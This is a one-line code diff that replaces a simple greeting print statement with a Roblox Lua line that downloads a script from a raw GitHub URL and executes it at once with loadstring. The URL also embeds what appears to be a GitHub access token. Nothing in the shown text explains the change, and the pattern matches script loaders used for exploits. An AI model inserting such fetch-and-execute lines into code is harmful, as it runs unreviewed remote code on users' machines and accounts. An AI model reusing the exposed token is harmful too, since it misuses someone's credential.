@@ -1,1 +1,1 @@
-print("Hi,whats your name?")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Heisenberg1374/tetst/main/test?token=GHSAT0AAAAAACCVJAUZ3XVULD55XFNZPOQWZD2Q7BQ"))()
